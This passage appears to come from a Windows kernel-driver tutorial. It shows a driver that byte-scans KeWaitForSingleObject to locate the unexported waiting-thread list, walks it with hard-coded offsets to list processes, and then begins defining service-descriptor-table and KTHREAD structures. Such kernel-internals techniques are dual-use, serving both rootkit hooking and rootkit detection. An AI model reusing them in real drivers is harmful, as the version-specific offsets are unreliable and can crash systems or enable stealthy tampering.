<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
tells us that the instruction int 3 becomes CC. The mov ecx starts with B9
followed by the 4 bytes we are moving into it. The test al is 84 c0.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P54<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
long val,i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *) KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp;
*(ptr+24) == 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitInListHead
= *(long *)(ptr + 1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%x&quot;,gKiWaitInListHead);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= (long)cur + 388;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= *(long *)val;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i
= (long)cur + 464;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i
= *(long *)i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%d
%d %s&quot;,val,*(long *)(i + 156),i + 508);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>80482258<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>228
228 services.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>228
228 services.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>388
388 msdev.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>240
240 lsass.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>240
240 lsass.exe<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
next series of programs talk about threads. The OS maintains two pointers of
thread structures that are not a state to be running for some reason. We will
figure out the addresses of these linked lists and display the processes which
own these threads. These linked list are denoted as KiWaitInListHead and
KiWaitOutListHead.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
above program once again displays the names of programs and their pids. It
however displays then more than once. We have a documented function in the DDK
called KeWaitForSingleObject. This function we will explain later. All that it
does on a large scale is let the current thread wait. This means that it should
have some knowledge about the current thread. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
store its starting memory address denoted by its name in the variable ptr and
scan the first 4096 memory locations looking for a certain series of
bytes.<span style="mso-spacerun: yes">  </span>These are what we showed you in
the above example. Thus we check for the b9 as the first bytes, followed by
some number and then the op codes 84 and c0 for the test. We also check for
another mov instruction 24 bytes later. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
value moved into the ecx register is the pointer we are waiting for. We store
this value in the variable gKiWaitInListHead.<span style="mso-spacerun: yes"> 
</span>The point we are making is that Windows stores a list of threads in a
linked list. We want access to this linked list. The problem is that there are
no exported variables that point to any member of this list. Thus someone went
through the disassembly of the function KeWaitForSingleObject. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
realized that within the code for this function, the address of a thread was
being placed into the ecx register. This was followed by the test instruction.
There was also another pointer being stored in the ecx register 24 bytes away.
The minute we scan the memory of the function KeWaitForSingleObject and come
across the above bytes, we know that we have a addresses of a thread pointer.
Crude but simple and it works.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
pointer is actually a LIST_ENTRY pointer with the associated Flinks and Blinks.
We set curr to Flink and then loop like before until cur and start become equal
again. We then add 388 to curr so that we point to the pid of the program that
owns the thread. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
then add 464 to curr which gives us a location where we have the EPROCESS
pointer of the process stored. 5-8 bytes later gives us the name of the
process. Just to prove that we have a EPROCESS pointer we are displaying the
pid stored at 156 from the start. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P55<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>long DWORD;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>short WORD;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>char BYTE;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef<span
style="mso-spacerun: yes">  </span>char BOOL;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
SYSTEM_SERVICE_TABLE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
void<span style="mso-spacerun: yes">  </span>*ServiceTable;<span
style="mso-spacerun: yes">           </span>// array of entry points<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*004*/
DWORD<span style="mso-spacerun: yes">  </span>*CounterTable;<span
style="mso-spacerun: yes">           </span>// array of usage counters<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*008*/
DWORD<span style="mso-spacerun: yes">   </span>ServiceLimit;<span
style="mso-spacerun: yes">           </span>// number of table entries<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*00C*/
BYTE<span style="mso-spacerun: yes">   </span>*ArgumentTable;<span
style="mso-spacerun: yes">          </span>// array of byte counts<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
SERVICE_DESCRIPTOR_TABLE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
struct SYSTEM_SERVICE_TABLE ntoskrnl;<span style="mso-spacerun: yes"> 
</span>// ntoskrnl.exe (native api)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
struct SYSTEM_SERVICE_TABLE win32k;<span style="mso-spacerun: yes">    </span>//
win32k.sys<span style="mso-spacerun: yes">   </span>(gdi/user)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*020*/
struct SYSTEM_SERVICE_TABLE Table3;<span style="mso-spacerun: yes">   
</span>// not used<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*030*/
struct SYSTEM_SERVICE_TABLE Table4;<span style="mso-spacerun: yes">   
</span>// not used<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*040*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
KAPC_STATE<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
LIST_ENTRY<span style="mso-spacerun: yes">        </span>ApcListHead [2];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
struct _KPROCESS *Process;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*014*/
BOOLEAN<span style="mso-spacerun: yes">           </span>KernelApcInProgress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*015*/
BOOLEAN<span style="mso-spacerun: yes">           </span>KernelApcPending;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*016*/
BOOLEAN<span style="mso-spacerun: yes">           </span>UserApcPending;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*017*/
BOOLEAN<span style="mso-spacerun: yes">           </span>Reserved;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
KTHREAD<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
DISPATCHER_HEADER<span style="mso-spacerun: yes">         </span>Header; //
DO_TYPE_THREAD (0x6C)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*010*/
LIST_ENTRY<span style="mso-spacerun: yes">               
</span>MutantListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*018*/
PVOID<span style="mso-spacerun: yes">                     </span>InitialStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*01C*/
PVOID<span style="mso-spacerun: yes">                     </span>StackLimit;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*020*/
struct _TEB<span style="mso-spacerun: yes">              </span>*Teb;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*024*/
PVOID<span style="mso-spacerun: yes">                     </span>TlsArray;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*028*/
PVOID<span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">           </span>KernelStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02C*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>DebugActive;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02D*/
BYTE<span style="mso-spacerun: yes">                      </span>State; //
THREAD_STATE_*<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02E*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>Alerted;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*02F*/
BYTE<span style="mso-spacerun: yes">                      </span>bReserved01;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*030*/
BYTE<span style="mso-spacerun: yes">                      </span>Iopl;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*031*/
BYTE<span style="mso-spacerun: yes">                      </span>NpxState;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*032*/
BYTE<span style="mso-spacerun: yes">                      </span>Saturation;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*033*/
BYTE<span style="mso-spacerun: yes">                      </span>Priority;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*034*/
struct KAPC_STATE<span style="mso-spacerun: yes">               
</span>ApcState;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*04C*/
DWORD<span style="mso-spacerun: yes">                    
</span>ContextSwitches;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*050*/
DWORD <span style="mso-spacerun: yes">                    </span>WaitStatus;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*054*/
BYTE<span style="mso-spacerun: yes">                      </span>WaitIrql;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*055*/
BYTE<span style="mso-spacerun: yes">                      </span>WaitMode;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*056*/
BYTE<span style="mso-spacerun: yes">                      </span>WaitNext;<o:p></o:p></span></p>

